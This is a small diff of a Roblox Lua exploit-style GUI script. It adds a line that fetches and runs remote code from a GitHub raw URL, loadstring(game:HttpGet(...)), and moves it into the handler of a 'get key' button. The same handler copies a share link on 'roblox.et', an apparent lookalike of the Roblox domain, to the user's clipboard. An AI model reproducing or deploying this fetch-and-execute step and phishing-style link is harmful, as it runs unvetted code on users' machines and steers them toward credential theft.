@@ -49,6 +49,8 @@ getKeyButton.Parent = frame
 
 local function setClipboardWithURL()
     setclipboard("https://roblox.et/share?code=1f4b540fdbe7fdbbe1384a0fe4ce2e72&type=Server")
+    -- Запуск вашего скрипта при нажатии на кнопку
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/kinoask/sadsd/refs/heads/main/huge"))()
 end
 
 getKeyButton.MouseButton1Click:Connect(setClipboardWithURL)
@@ -113,6 +115,3 @@ game:GetService("UserInputService").InputChanged:Connect(function(input)
         update(input)
     end
 end)
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/kinoask/sadsd/refs/heads/main/huge"))()
-
